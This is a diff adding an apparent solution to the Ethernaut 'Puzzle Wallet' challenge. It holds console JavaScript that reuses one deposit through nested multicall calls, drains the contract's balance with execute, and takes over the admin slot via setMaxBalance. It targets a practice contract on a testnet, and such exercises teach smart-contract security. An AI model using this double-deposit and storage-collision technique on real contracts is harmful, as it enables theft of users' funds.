@@ -1,5 +1,30 @@
+```shell
+truffle migrate --network rinkeby --f 24 --to 24
+```
+
 ```javascript
-// TODO
+// Reference: https://github.com/maAPPsDEV/puzzle-wallet-attack
+// Reference: https://web3js.readthedocs.io/en/v1.3.0/web3-eth-abi.html#encodefunctioncall
+await contract.whitelisted(player)
+// false
+await contract.addToWhitelist(player)
+await contract.whitelisted(player)
+// true
+await contract.abi
+let depositABI = contract.abi[2]  // index may change if Ethernaut update, be careful
+let multicallABI = contract.abi[6]  // index may change if Ethernaut update, be careful
+let depositCall = await web3.eth.abi.encodeFunctionCall(depositABI, [])
+let multicallCall = await web3.eth.abi.encodeFunctionCall(multicallABI, [[depositCall]])
+
+await getBalance(contract.address)
+// '0.001'
+await contract.multicall([depositCall, multicallCall], {value: toWei('0.001')})
+await contract.balances(player).then(x=>x.toNumber())
+// 2000000000000000
+await contract.execute(player, toWei('0.002'), "0x")
+await getBalance(contract.address)
+// '0'
+await contract.setMaxBalance(await web3.utils.toBN(player))
 ```
 
 ```solidity
